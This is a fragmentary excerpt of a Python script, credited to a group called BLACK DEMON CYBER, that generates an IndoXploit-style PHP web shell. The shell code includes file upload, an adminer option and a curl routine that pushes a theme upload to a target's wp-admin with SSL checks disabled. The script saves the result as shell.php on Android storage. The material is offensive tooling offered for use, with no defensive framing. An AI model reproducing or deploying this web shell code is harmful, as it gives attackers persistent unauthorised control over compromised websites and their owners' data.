...
print mess
print GG+"<========================>"
print WW+"Author  : \033[36mSuhandi.ID"
print WW+"Thanks  : \033[32mMr.Includex"
print WW+"Team    : \033[90mBLACK DEMON CYBER"
print GG+"<=======================================>"
print GG+"Created The Shell !"
print CC+"Please Wait.."
time.sleep(10)
...
<html>
<head>
<title>Suhandi IndoXploit</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
...
// Tapi Selebihnya, itu hasil kreasi Demon's sendiri.
// Tanpa kalian kita tidak akan BESAR seperti sekarang.
// Greetz: All Member BlackDemonCyber. & all my friends & mr.ghost includex.
###############################################################################
function w($dir,$perm) {
	if(!is_writable($dir)) {
...
messagescript6 = """echo "Upload File:
...
messagescript8 = """} elseif($_GET['do'] == 'adminer') {
...
messagescript9 = """$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
					  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
...
messagescript10 = """} else {
	...
	echo "<center>Copyright &copy; ".date("Y")." - <a href='http://www.infinitehaxor.com/' target='_blank'><font color=lime>IndoXploit</font></a></center>";
}
...
print GG+"Selesai !"
os.system("mv shell.php /storage/emulated/0")

print CC+"Shell Mu \033[0m(shell.php)\033[36mBerada Di luar folder 'penyimpanam intermal' !"